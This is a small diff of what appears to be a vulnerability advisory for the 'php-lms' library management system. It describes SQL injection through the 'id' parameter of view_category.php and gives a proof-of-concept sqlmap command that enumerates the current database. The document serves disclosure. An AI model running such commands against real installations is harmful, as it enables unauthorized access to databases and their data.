@@ -14,4 +14,4 @@
 + The lack of proper input validation and sanitization on the 'id' parameter allows an attacker to craft SQL injection queries and gaining unauthorized access to the database.
 
 # Proof of Concept (PoC) : 
-+ `sqlmap -u "http://localhost/php-lms/admin/category/view_category.php?id=1"--data "id=1"  --batch --level 5 --risk 3 --dbms=mysql --threads 10 --current-db`
++ `sqlmap -u "http://localhost/php-lms/admin/category/view_category.php?id=1"--data "id=1" --batch --level 5 --risk 3 --dbms=mysql --threads 10 --current-db`
